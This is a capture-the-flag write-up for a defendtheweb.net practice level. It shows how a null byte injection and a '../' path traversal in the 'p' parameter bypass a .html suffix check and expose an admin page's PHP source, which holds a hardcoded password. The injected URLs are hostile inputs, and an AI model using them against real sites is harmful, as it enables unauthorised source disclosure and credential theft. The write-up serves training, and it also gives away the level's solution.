<https://defendtheweb.net/playground/princess-slag>

## Poison Null Byte

The three tabs (i.e., home, news, contact) are accessible at: <https://defendtheweb.net/extras/playground/princess-slag/?p=index>

The admin page is accessible at: <https://defendtheweb.net/extras/playground/princess-slag/admin.php?password=rw>

We try to access <https://defendtheweb.net/extras/playground/princess-slag/?p=admin>, and then get:

```text
Warning: file_get_contents(admin.html) [function.file-get-contents]: failed to open stream: No such file or directory in pages on line 22
```

Thus, it is able to use Null Byte Injection to let `.php` pass the check of `.html` suffix: <https://defendtheweb.net/extras/playground/princess-slag/?p=admin.php%00>.

```text
Warning: file_get_contents(admin.php) [function.file-get-contents]: failed to open stream: No such file or directory in pages on line 22
```

Then go a leval up: <https://defendtheweb.net/extras/playground/princess-slag/?p=../admin.php%00>.

Then view source:

```php
<div id="content">
    <?php
        session_start();
        if(isset($_GET['password']) ){
            if( $_GET['password'] == 'b3fa0b1861'){
                echo "Correct password"
            } else {
                echo "Incorrect password";
            }
        }
    ?>
    <form>
        <input type="password" name="password" /><input type="submit" value="Login" />
    </form>
</div>
```

Thus we can access the source code from the `.php` file in backend rather than the rendered `.html` in frontend.

## Reference

<https://defendtheweb.net/article/common-php-attacks-poison-null-byte>

<https://alexandervoidstar.wordpress.com/2015/11/07/hackthis-real-level-5/>
